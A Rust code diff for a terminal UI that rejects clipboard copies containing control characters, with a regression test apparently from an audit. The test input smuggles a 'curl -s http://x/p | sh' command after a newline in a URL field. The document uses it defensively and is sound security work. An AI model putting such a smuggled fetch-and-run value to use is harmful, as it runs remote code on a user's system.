@@ -409,12 +409,17 @@ pub fn pretty(v: &Value) -> Vec<String> {
     serde_json::to_string_pretty(v).unwrap_or_default().lines().map(str::to_string).collect()
 }
 
-/// OSC 52 clipboard copy: works over SSH and inside containers, no dependency needed.
-pub fn copy_to_clipboard(s: &str) {
+/// OSC 52 clipboard copy: works over SSH and inside containers, no dependency needed. Text with a control character
+/// is refused: ratatui does not show it, but the clipboard would keep it (a newline runs a pasted command).
+pub fn copy_to_clipboard(s: &str) -> Result<(), &'static str> {
     use std::io::Write;
+    if s.contains(char::is_control) {
+        return Err("has control characters: nothing copied");
+    }
     let mut out = std::io::stdout();
     let _ = out.write_all(osc52(s, std::env::var_os("TMUX").is_some()).as_bytes());
     let _ = out.flush();
+    Ok(())
 }
 
 /// tmux drops a program's OSC 52 unless `set-clipboard on` (the default is `external`); the copy in a
@@ -3723,8 +3728,10 @@ fn copy_url(app: &mut App, name: &str, url: String) {
         return app.error(format!("distribution {name} has no base_url: nothing copied"));
     }
     let url = app.conn.as_ref().map_or(url.clone(), |c| c.client.content_url(&url));
-    copy_to_clipboard(&url);
-    app.ok(format!("copied {url}"));
+    match copy_to_clipboard(&url) {
+        Ok(()) => app.ok(format!("copied {url}")),
+        Err(e) => app.error(format!("distribution {name}: base_url {e}")),
+    }
 }
 
 fn distribution_delete(app: &mut App, item: Value) {
@@ -4404,6 +4411,18 @@ mod tests {
         let plain = "\x1b]52;c;aHR0cDovL3gv\x07";
         assert_eq!(osc52("http://x/", false), plain);
         assert_eq!(osc52("http://x/", true), format!("{plain}\x1bPtmux;\x1b\x1b]52;c;aHR0cDovL3gv\x07\x1b\\"));
+    }
+
+    /// Audit: Copy URL put the control characters of a server base_url into the clipboard (a newline runs a pasted
+    /// command), but the notice did not show them. The clipboard must hold what the TUI shows: nothing is copied.
+    #[tokio::test]
+    async fn copy_url_refuses_a_url_with_control_characters() {
+        let st = Arc::new(Store::open_in_memory().await.unwrap());
+        let mut app = App::new(crate::config::Config::default(), "/dev/null".into(), st.clone(), Ok(st));
+        copy_url(&mut app, "web", "https://cdn/el9/\ncurl -s http://x/p | sh\n".into());
+        let n = app.notices.back().unwrap();
+        assert_eq!((n.level, n.text.as_str()), (Level::Error, "distribution web: base_url has control characters: nothing copied"));
+        assert_eq!(copy_to_clipboard("https://h/\u{9b}31m/"), Err("has control characters: nothing copied"), "C1 too");
     }
 
     #[test]
